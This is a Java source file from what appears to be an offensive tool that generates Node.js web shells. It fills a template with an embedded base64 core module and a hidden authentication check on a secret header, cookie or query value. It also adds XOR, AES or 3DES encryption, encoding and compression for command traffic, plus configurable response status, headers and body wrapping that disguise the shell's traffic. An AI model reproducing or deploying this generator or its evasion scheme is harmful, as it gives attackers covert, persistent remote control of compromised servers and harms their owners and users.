package com.reajason.noone.core.generator;

import com.reajason.noone.core.profile.config.HttpRequestBodyType;
import com.reajason.noone.core.profile.config.HttpResponseBodyType;
import com.reajason.noone.core.generator.config.NoOneConfig;
import com.reajason.noone.core.generator.protocol.HttpProtocolMetadata;
import com.reajason.noone.core.profile.config.*;
import com.reajason.noone.core.transform.TransformDirection;
import com.reajason.noone.core.transform.*;
import com.reajason.noone.core.profile.Profile;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Generates Node.js (.mjs) web shells by filling template placeholders
 * with implementations derived from the Profile configuration.
 * <p>
 * This is the Node.js counterpart of {@link NoOneDotNetWebShellGenerator}, which handles ASPX/ASHX/ASMX/SOAP.
 *
 * @author ReaJason
 */
public class NoOneNodeJsWebShellGenerator {

    private static final String MJS_TEMPLATE_PATH = "/templates/nodejs/vul-nodejs-server.mjs";
    private static final String CORE_MJS_PATH = "/nodejs-core.mjs";

    private static final String PLACEHOLDER_CORE_CODE_BASE64 = "__CORE_CODE_BASE64__";
    private static final String PLACEHOLDER_IS_AUTHED = "__IS_AUTHED__";
    private static final String PLACEHOLDER_GET_ARG_FROM_CONTENT = "__GET_ARG_FROM_CONTENT__";
    private static final String PLACEHOLDER_TRANSFORM_REQ_PAYLOAD = "__TRANSFORM_REQ_PAYLOAD__";
    private static final String PLACEHOLDER_TRANSFORM_RES_DATA = "__TRANSFORM_RES_DATA__";
    private static final String PLACEHOLDER_WRAP_RES_DATA = "__WRAP_RES_DATA__";
    private static final String PLACEHOLDER_WRAP_RESPONSE = "__WRAP_RESPONSE__";
    private static final String PLACEHOLDER_EXTRA_HELPERS = "__EXTRA_HELPERS__";

    private static final String DEFAULT_IS_AUTHED = "true";
    private static final String DEFAULT_GET_ARG_FROM_CONTENT = "    function getArgFromContent(content) {\n        return content;\n    }";
    private static final String DEFAULT_TRANSFORM_REQ_PAYLOAD = "    function transformReqPayload(payload) {\n        return payload;\n    }";
    private static final String DEFAULT_TRANSFORM_RES_DATA = "    function transformResData(payload) {\n        return payload;\n    }";
    private static final String DEFAULT_WRAP_RES_DATA = "    function wrapResData(data) {\n        return data;\n    }";
    private static final String DEFAULT_WRAP_RESPONSE = "";

    private final NoOneConfig config;

    public NoOneNodeJsWebShellGenerator(NoOneConfig config) {
        this.config = Objects.requireNonNull(config, "config");
    }

    public String generateMjs() {
        return fillTemplate(loadTemplate(MJS_TEMPLATE_PATH));
    }

    // ==================== Template filling ====================

    private String fillTemplate(String template) {
        String isAuthed = DEFAULT_IS_AUTHED;
        String getArgFromContent = DEFAULT_GET_ARG_FROM_CONTENT;
        String transformReqPayload = DEFAULT_TRANSFORM_REQ_PAYLOAD;
        String transformResData = DEFAULT_TRANSFORM_RES_DATA;
        String wrapResData = DEFAULT_WRAP_RES_DATA;
        String wrapResponse = DEFAULT_WRAP_RESPONSE;
        String helperBlock = "";

        Profile profile = config.getCoreProfile();
        if (profile != null) {
            isAuthed = generateIsAuthed(profile.getIdentifier());

            ProtocolConfig protocolConfig = profile.getProtocolConfig();
            if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
                getArgFromContent = generateGetArgFromContent(httpConfig.getRequestBodyType(), httpConfig.getRequestTemplate());
                wrapResData = generateWrapResData(httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate());
                wrapResponse = generateWrapResponse(httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders());
            }

            TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
            TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());

            if (!isNone(reqSpec)) {
                String keyBase64 = computeKeyBase64(profile.getPassword(), reqSpec.encryption());
                transformReqPayload = generateTransformMethod("transformReqPayload", "payload", TransformDirection.INBOUND, reqSpec, keyBase64);
            }

            if (!isNone(resSpec)) {
                String keyBase64 = computeKeyBase64(profile.getPassword(), resSpec.encryption());
                transformResData = generateTransformMethod("transformResData", "payload", TransformDirection.OUTBOUND, resSpec, keyBase64);
            }

            Set<String> needed = collectNeededHelpers(reqSpec, resSpec);
            helperBlock = buildHelperMethodBlock(needed);
        }

        return template
                .replace(PLACEHOLDER_CORE_CODE_BASE64, generateCoreCodeBase64())
                .replace(PLACEHOLDER_IS_AUTHED, isAuthed)
                .replace(PLACEHOLDER_GET_ARG_FROM_CONTENT, getArgFromContent)
                .replace(PLACEHOLDER_TRANSFORM_REQ_PAYLOAD, transformReqPayload)
                .replace(PLACEHOLDER_TRANSFORM_RES_DATA, transformResData)
                .replace(PLACEHOLDER_WRAP_RES_DATA, wrapResData)
                .replace(PLACEHOLDER_WRAP_RESPONSE, wrapResponse)
                .replace(PLACEHOLDER_EXTRA_HELPERS, helperBlock);
    }

    // ==================== Core code generation ====================

    private String generateCoreCodeBase64() {
        try (InputStream in = NoOneNodeJsWebShellGenerator.class.getResourceAsStream(CORE_MJS_PATH)) {
            if (in == null) {
                throw new IllegalStateException("Core MJS not found: " + CORE_MJS_PATH);
            }
            byte[] mjsBytes = in.readAllBytes();
            return Base64.getEncoder().encodeToString(mjsBytes);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to read core MJS: " + CORE_MJS_PATH, e);
        }
    }

    // ==================== IsAuthed ====================

    private String generateIsAuthed(IdentifierConfig identifier) {
        if (identifier == null) {
            return "true";
        }

        String name = escapeJavaScript(identifier.getName());
        String value = escapeJavaScript(identifier.getValue());
        IdentifierLocation location = identifier.getLocation();
        IdentifierOperator operator = identifier.getOperator() != null
                ? identifier.getOperator() : IdentifierOperator.EQUALS;

        if (location == IdentifierLocation.COOKIE) {
            // Parse cookie from req.headers.cookie
            return "(function() { const cookies = (req.headers.cookie || '').split(';').reduce((acc, c) => { "
                    + "const [k, ...v] = c.trim().split('='); acc[k] = v.join('='); return acc; }, {}); "
                    + "const v = cookies['" + name + "']; "
                    + "return " + jsOperatorExpr("v", operator, value) + "; }())";
        } else if (location == IdentifierLocation.QUERY_PARAM) {
            return "(function() { const v = new URL(req.url, 'http://localhost').searchParams.get('" + name + "'); "
                    + "return " + jsOperatorExpr("v", operator, value) + "; }())";
        } else {
            // HEADER (default)
            String headerName = name.toLowerCase(Locale.ROOT);
            return "(function() { const v = req.headers['" + headerName + "']; "
                    + "return " + jsOperatorExpr("v", operator, value) + "; }())";
        }
    }

    private static String jsOperatorExpr(String varName, IdentifierOperator op, String value) {
        return switch (op) {
            case EQUALS -> varName + " === '" + value + "'";
            case CONTAINS -> varName + " != null && " + varName + ".includes('" + value + "')";
            case STARTS_WITH -> varName + " != null && " + varName + ".startsWith('" + value + "')";
            case ENDS_WITH -> varName + " != null && " + varName + ".endsWith('" + value + "')";
        };
    }

    // ==================== GetArgFromContent ====================

    private String generateGetArgFromContent(HttpRequestBodyType bodyType, String template) {
        if (bodyType == null) {
            return DEFAULT_GET_ARG_FROM_CONTENT;
        }

        HttpProtocolMetadata.PrefixSuffixIndexes indexes =
                HttpProtocolMetadata.calculateRequestBodyIndexes(bodyType, template);
        int prefix = indexes != null ? indexes.prefixLength() : 0;
        int suffix = indexes != null ? indexes.suffixLength() : 0;

        StringBuilder sb = new StringBuilder();
        sb.append("    function getArgFromContent(content) {\n");

        if (bodyType == HttpRequestBodyType.FORM_URLENCODED) {
            String paramName = HttpProtocolMetadata.extractParameterName(template);
            if (paramName == null) {
                paramName = "q";
            }
            sb.append("        const params = new URLSearchParams(content.toString('utf8'));\n");
            sb.append("        const value = params.get('").append(escapeJavaScript(paramName)).append("');\n");
            if (prefix == 0 && suffix == 0) {
                sb.append("        return Buffer.from(value, 'utf8');\n");
            } else {
                sb.append("        return Buffer.from(value.substring(").append(prefix)
                        .append(", value.length - ").append(suffix).append("), 'utf8');\n");
            }
        } else {
            if (prefix == 0 && suffix == 0) {
                sb.append("        return content;\n");
            } else {
                sb.append("        return content.slice(").append(prefix)
                        .append(", content.length - ").append(suffix).append(");\n");
            }
        }

        sb.append("    }");
        return sb.toString();
    }

    // ==================== Transform methods ====================

    private String generateTransformMethod(String methodName, String paramName,
                                           TransformDirection direction,
                                           TransformationSpec spec, String keyBase64) {
        StringBuilder sb = new StringBuilder();
        sb.append("    function ").append(methodName).append("(").append(paramName).append(") {\n");
        sb.append("        if (").append(paramName).append(" == null) return Buffer.alloc(0);\n");
        sb.append("        let data = ").append(paramName).append(";\n");

        boolean needsKey = spec.encryption() != null && spec.encryption() != EncryptionAlgorithm.NONE;
        if (needsKey) {
            sb.append("        const key = Buffer.from('").append(keyBase64).append("', 'base64');\n");
        }

        if (direction == TransformDirection.INBOUND) {
            appendDecodeStep(sb, spec.encoding());
            appendDecryptStep(sb, spec.encryption());
            appendDecompressStep(sb, spec.compression());
        } else {
            appendCompressStep(sb, spec.compression());
            appendEncryptStep(sb, spec.encryption());
            appendEncodeStep(sb, spec.encoding());
        }

        sb.append("        return data;\n");
        sb.append("    }");
        return sb.toString();
    }

    private void appendDecodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "decodeBase64";
            case HEX -> "decodeHex";
            case BIG_INTEGER -> "decodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data);\n");
        }
    }

    private void appendEncodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "encodeBase64";
            case HEX -> "encodeHex";
            case BIG_INTEGER -> "encodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data);\n");
        }
    }

    private void appendDecryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "xor";
            case AES -> "aesDecrypt";
            case TRIPLE_DES -> "tripleDesDecrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendEncryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "xor";
            case AES -> "aesEncrypt";
            case TRIPLE_DES -> "tripleDesEncrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendDecompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "gzipDecompress";
            case DEFLATE -> "deflateDecompress";
            case LZ4 -> "lz4Decompress";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data);\n");
        }
    }

    private void appendCompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "gzipCompress";
            case DEFLATE -> "deflateCompress";
            case LZ4 -> "lz4Compress";
            default -> null;
        };
        if (method != null) {
            sb.append("        data = ").append(method).append("(data);\n");
        }
    }

    // ==================== WrapResData ====================

    private String generateWrapResData(HttpResponseBodyType bodyType, String template) {
        HttpProtocolMetadata.ResponsePrefixSuffix parts =
                HttpProtocolMetadata.calculateResponseParts(bodyType, template);
        byte[] prefixBytes = parts != null ? parts.prefixBytes() : new byte[0];
        byte[] suffixBytes = parts != null ? parts.suffixBytes() : new byte[0];

        if (prefixBytes.length == 0 && suffixBytes.length == 0) {
            return DEFAULT_WRAP_RES_DATA;
        }

        String prefixB64 = Base64.getEncoder().encodeToString(prefixBytes);
        String suffixB64 = Base64.getEncoder().encodeToString(suffixBytes);

        StringBuilder sb = new StringBuilder();
        sb.append("    function wrapResData(data) {\n");
        sb.append("        const prefix = Buffer.from('").append(prefixB64).append("', 'base64');\n");
        sb.append("        const suffix = Buffer.from('").append(suffixB64).append("', 'base64');\n");
        sb.append("        return Buffer.concat([prefix, data, suffix]);\n");
        sb.append("    }");
        return sb.toString();
    }

    // ==================== WrapResponse ====================

    private String generateWrapResponse(int statusCode, Map<String, String> headers) {
        if (statusCode <= 0 && (headers == null || headers.isEmpty())) {
            return DEFAULT_WRAP_RESPONSE;
        }

        StringBuilder sb = new StringBuilder();

        int code = statusCode > 0 ? statusCode : 200;
        sb.append("res.writeHead(").append(code).append(", {");

        if (headers != null && !headers.isEmpty()) {
            sb.append("\n");
            Iterator<Map.Entry<String, String>> it = headers.entrySet().iterator();
            while (it.hasNext()) {
                Map.Entry<String, String> entry = it.next();
                sb.append("                    '").append(escapeJavaScript(entry.getKey()))
                        .append("': '").append(escapeJavaScript(entry.getValue())).append("'");
                if (it.hasNext()) {
                    sb.append(",");
                }
                sb.append("\n");
            }
            sb.append("                });");
        } else {
            sb.append("});");
        }

        return sb.toString();
    }

    // ==================== Helper method collection ====================

    private Set<String> collectNeededHelpers(TransformationSpec reqSpec, TransformationSpec resSpec) {
        Set<String> needed = new LinkedHashSet<>();
        collectForSpec(needed, reqSpec, TransformDirection.INBOUND);
        collectForSpec(needed, resSpec, TransformDirection.OUTBOUND);
        return needed;
    }

    private void collectForSpec(Set<String> out, TransformationSpec spec, TransformDirection direction) {
        if (isNone(spec)) return;

        CompressionAlgorithm compression = spec.compression();
        if (compression != null && compression != CompressionAlgorithm.NONE) {
            switch (compression) {
                case GZIP -> out.add(direction == TransformDirection.INBOUND ? "gzipDecompress" : "gzipCompress");
                case DEFLATE -> out.add(direction == TransformDirection.INBOUND ? "deflateDecompress" : "deflateCompress");
                case LZ4 -> out.add(direction == TransformDirection.INBOUND ? "lz4Decompress" : "lz4Compress");
                default -> {}
            }
        }

        EncryptionAlgorithm encryption = spec.encryption();
        if (encryption != null && encryption != EncryptionAlgorithm.NONE) {
            switch (encryption) {
                case XOR -> out.add("xor");
                case AES -> out.add(direction == TransformDirection.INBOUND ? "aesDecrypt" : "aesEncrypt");
                case TRIPLE_DES -> out.add(direction == TransformDirection.INBOUND ? "tripleDesDecrypt" : "tripleDesEncrypt");
                default -> {}
            }
        }

        EncodingAlgorithm encoding = spec.encoding();
        if (encoding != null && encoding != EncodingAlgorithm.NONE) {
            switch (encoding) {
                case BASE64 -> out.add(direction == TransformDirection.INBOUND ? "decodeBase64" : "encodeBase64");
                case HEX -> out.add(direction == TransformDirection.INBOUND ? "decodeHex" : "encodeHex");
                case BIG_INTEGER -> out.add(direction == TransformDirection.INBOUND ? "decodeBigInteger" : "encodeBigInteger");
                default -> {}
            }
        }
    }

    // ==================== Helper method block generation ====================

    private String buildHelperMethodBlock(Set<String> needed) {
        if (needed.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();

        if (needed.contains("decodeBase64")) append(sb, HELPER_DECODE_BASE64);
        if (needed.contains("encodeBase64")) append(sb, HELPER_ENCODE_BASE64);
        if (needed.contains("decodeHex")) append(sb, HELPER_DECODE_HEX);
        if (needed.contains("encodeHex")) append(sb, HELPER_ENCODE_HEX);
        if (needed.contains("decodeBigInteger")) append(sb, HELPER_DECODE_BIG_INTEGER);
        if (needed.contains("encodeBigInteger")) append(sb, HELPER_ENCODE_BIG_INTEGER);

        if (needed.contains("xor")) append(sb, HELPER_XOR);
        if (needed.contains("aesEncrypt")) append(sb, HELPER_AES_ENCRYPT);
        if (needed.contains("aesDecrypt")) append(sb, HELPER_AES_DECRYPT);
        if (needed.contains("tripleDesEncrypt")) append(sb, HELPER_TRIPLE_DES_ENCRYPT);
        if (needed.contains("tripleDesDecrypt")) append(sb, HELPER_TRIPLE_DES_DECRYPT);

        if (needed.contains("gzipCompress")) append(sb, HELPER_GZIP_COMPRESS);
        if (needed.contains("gzipDecompress")) append(sb, HELPER_GZIP_DECOMPRESS);
        if (needed.contains("deflateCompress")) append(sb, HELPER_DEFLATE_COMPRESS);
        if (needed.contains("deflateDecompress")) append(sb, HELPER_DEFLATE_DECOMPRESS);
        if (needed.contains("lz4Compress")) append(sb, HELPER_LZ4_COMPRESS);
        if (needed.contains("lz4Decompress")) append(sb, HELPER_LZ4_DECOMPRESS);

        if (sb.isEmpty()) return "";
        while (sb.charAt(sb.length() - 1) == '\n') {
            sb.setLength(sb.length() - 1);
        }
        return sb.toString();
    }

    private static void append(StringBuilder sb, String method) {
        sb.append(method).append("\n\n");
    }

    // ==================== Utilities ====================

    private static String loadTemplate(String path) {
        try (InputStream in = NoOneNodeJsWebShellGenerator.class.getResourceAsStream(path)) {
            if (in == null) {
                throw new IllegalStateException("Template not found: " + path);
            }
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to load template: " + path, e);
        }
    }

    private static boolean isNone(TransformationSpec spec) {
        if (spec == null) return true;
        return spec.compression() == CompressionAlgorithm.NONE
                && spec.encryption() == EncryptionAlgorithm.NONE
                && spec.encoding() == EncodingAlgorithm.NONE;
    }

    private static String computeKeyBase64(String password, EncryptionAlgorithm algorithm) {
        if (algorithm == null || algorithm == EncryptionAlgorithm.NONE) return "";
        String context = switch (algorithm) {
            case XOR -> "XOR";
            case AES -> "AES";
            case TRIPLE_DES -> "TripleDES";
            case NONE -> "";
        };
        byte[] key = TransformSupport.deriveKey(password, context, algorithm.keyLengthBytes());
        return Base64.getEncoder().encodeToString(key);
    }

    private static String escapeJavaScript(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("'", "\\'")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // ==================== JavaScript helper method source code ====================

    private static final String HELPER_DECODE_BASE64 = """
        function decodeBase64(input) {
            if (input == null || input.length === 0) return Buffer.alloc(0);
            return Buffer.from(input.toString('utf8'), 'base64');
        }""";

    private static final String HELPER_ENCODE_BASE64 = """
        function encodeBase64(input) {
            if (input == null || input.length === 0) return Buffer.alloc(0);
            return Buffer.from(input.toString('base64'), 'utf8');
        }""";

    private static final String HELPER_DECODE_HEX = """
        function decodeHex(input) {
            const s = input.toString('utf8').trim();
            if (s.length === 0) return Buffer.alloc(0);
            return Buffer.from(s, 'hex');
        }""";

    private static final String HELPER_ENCODE_HEX = """
        function encodeHex(input) {
            return Buffer.from(input.toString('hex'), 'utf8');
        }""";

    private static final String HELPER_DECODE_BIG_INTEGER = """
        function decodeBigInteger(input) {
            const s = input.toString('utf8').trim();
            if (s.length === 0) return Buffer.alloc(0);
            let big = 0n;
            for (let i = 0; i < s.length; i++) {
                const c = s.charCodeAt(i);
                let digit;
                if (c >= 48 && c <= 57) digit = c - 48;
                else if (c >= 97 && c <= 122) digit = c - 97 + 10;
                else if (c >= 65 && c <= 90) digit = c - 65 + 10;
                else throw new Error('Invalid character: ' + s[i]);
                big = big * 36n + BigInt(digit);
            }
            const hex = big.toString(16);
            const padded = hex.length % 2 === 0 ? hex : '0' + hex;
            const withPrefix = Buffer.from(padded, 'hex');
            if (withPrefix.length === 0) return Buffer.alloc(0);
            let offset = 0;
            if (withPrefix[0] === 0 && withPrefix.length > 1) offset = 1;
            if (withPrefix[offset] !== 1) throw new Error('Invalid BigInteger payload');
            return withPrefix.slice(offset + 1);
        }""";

    private static final String HELPER_ENCODE_BIG_INTEGER = """
        function encodeBigInteger(input) {
            const withPrefix = Buffer.alloc(input.length + 1);
            withPrefix[0] = 1;
            input.copy(withPrefix, 1);
            const padded = '00' + withPrefix.toString('hex');
            let big = BigInt('0x' + padded);
            const chars = '0123456789abcdefghijklmnopqrstuvwxyz';
            if (big === 0n) return Buffer.from('0', 'utf8');
            let s = '';
            while (big > 0n) {
                s = chars[Number(big % 36n)] + s;
                big = big / 36n;
            }
            return Buffer.from(s, 'utf8');
        }""";

    private static final String HELPER_XOR = """
        function xor(input, key) {
            if (key == null || key.length === 0) return input;
            const output = Buffer.alloc(input.length);
            for (let i = 0; i < input.length; i++) {
                output[i] = input[i] ^ key[i % key.length];
            }
            return output;
        }""";

    private static final String HELPER_AES_ENCRYPT = """
        function aesEncrypt(data, key) {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
            const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            return Buffer.concat([iv, encrypted]);
        }""";

    private static final String HELPER_AES_DECRYPT = """
        function aesDecrypt(data, key) {
            const iv = data.slice(0, 16);
            const encrypted = data.slice(16);
            const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
            return Buffer.concat([decipher.update(encrypted), decipher.final()]);
        }""";

    private static final String HELPER_TRIPLE_DES_ENCRYPT = """
        function tripleDesEncrypt(data, key) {
            const iv = crypto.randomBytes(8);
            const cipher = crypto.createCipheriv('des-ede3-cbc', key, iv);
            const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            return Buffer.concat([iv, encrypted]);
        }""";

    private static final String HELPER_TRIPLE_DES_DECRYPT = """
        function tripleDesDecrypt(data, key) {
            const iv = data.slice(0, 8);
            const encrypted = data.slice(8);
            const decipher = crypto.createDecipheriv('des-ede3-cbc', key, iv);
            return Buffer.concat([decipher.update(encrypted), decipher.final()]);
        }""";

    private static final String HELPER_GZIP_COMPRESS = """
        function gzipCompress(data) {
            return zlib.gzipSync(data);
        }""";

    private static final String HELPER_GZIP_DECOMPRESS = """
        function gzipDecompress(data) {
            return zlib.gunzipSync(data);
        }""";

    private static final String HELPER_DEFLATE_COMPRESS = """
        function deflateCompress(data) {
            return zlib.deflateSync(data);
        }""";

    private static final String HELPER_DEFLATE_DECOMPRESS = """
        function deflateDecompress(data) {
            return zlib.inflateSync(data);
        }""";

    private static final String HELPER_LZ4_COMPRESS = """
        function lz4Compress(input) {
            if (input == null || input.length === 0) return Buffer.alloc(0);
            const hashLog = 16;
            const hashSize = 1 << hashLog;
            const minMatch = 4;
            const maxDist = 0xFFFF;
            const table = new Int32Array(hashSize).fill(-1);
            const chunks = [];
            let anchor = 0;
            let i = 0;
            const limit = input.length - minMatch;
            while (i <= limit) {
                const h = ((input[i] | (input[i+1] << 8) | (input[i+2] << 16) | (input[i+3] << 24)) * 0x9E3779B1 >>> (32 - hashLog)) & (hashSize - 1);
                const ref = table[h];
                table[h] = i;
                if (ref < 0 || (i - ref) > maxDist || input[ref] !== input[i] || input[ref+1] !== input[i+1] || input[ref+2] !== input[i+2] || input[ref+3] !== input[i+3]) {
                    i++;
                    continue;
                }
                let matchLen = minMatch;
                const max = input.length - i;
                while (matchLen < max && input[ref + matchLen] === input[i + matchLen]) matchLen++;
                const literalLen = i - anchor;
                const token = (Math.min(literalLen, 15) << 4) | Math.min(matchLen - minMatch, 15);
                chunks.push(Buffer.from([token]));
                if (literalLen >= 15) { let n = literalLen - 15; while (n >= 255) { chunks.push(Buffer.from([255])); n -= 255; } chunks.push(Buffer.from([n])); }
                if (literalLen > 0) chunks.push(input.slice(anchor, anchor + literalLen));
                const off = i - ref;
                chunks.push(Buffer.from([off & 0xFF, (off >> 8) & 0xFF]));
                const matchExtra = matchLen - minMatch;
                if (matchExtra >= 15) { let n = matchExtra - 15; while (n >= 255) { chunks.push(Buffer.from([255])); n -= 255; } chunks.push(Buffer.from([n])); }
                i += matchLen;
                anchor = i;
            }
            const lastLiterals = input.length - anchor;
            const lastToken = Math.min(lastLiterals, 15) << 4;
            chunks.push(Buffer.from([lastToken]));
            if (lastLiterals >= 15) { let n = lastLiterals - 15; while (n >= 255) { chunks.push(Buffer.from([255])); n -= 255; } chunks.push(Buffer.from([n])); }
            if (lastLiterals > 0) chunks.push(input.slice(anchor, anchor + lastLiterals));
            return Buffer.concat(chunks);
        }""";

    private static final String HELPER_LZ4_DECOMPRESS = """
        function lz4Decompress(input) {
            if (input == null || input.length === 0) return Buffer.alloc(0);
            const minMatch = 4;
            let output = Buffer.alloc(Math.max(64, input.length * 4));
            let outPos = 0;
            let inPos = 0;
            while (inPos < input.length) {
                const token = input[inPos++] & 0xFF;
                let literalLen = token >> 4;
                if (literalLen === 15) { let add; do { add = input[inPos++] & 0xFF; literalLen += add; } while (add === 255); }
                if (outPos + literalLen > output.length) { const tmp = Buffer.alloc(Math.max(output.length + (output.length >> 1), outPos + literalLen)); output.copy(tmp, 0, 0, outPos); output = tmp; }
                input.copy(output, outPos, inPos, inPos + literalLen);
                inPos += literalLen;
                outPos += literalLen;
                if (inPos >= input.length) break;
                const off = (input[inPos++] & 0xFF) | ((input[inPos++] & 0xFF) << 8);
                let matchLen = token & 0x0F;
                if (matchLen === 15) { let add; do { add = input[inPos++] & 0xFF; matchLen += add; } while (add === 255); }
                matchLen += minMatch;
                if (outPos + matchLen > output.length) { const tmp = Buffer.alloc(Math.max(output.length + (output.length >> 1), outPos + matchLen)); output.copy(tmp, 0, 0, outPos); output = tmp; }
                const matchPos = outPos - off;
                for (let j = 0; j < matchLen; j++) { output[outPos++] = output[matchPos + j]; }
            }
            return output.slice(0, outPos);
        }""";
}
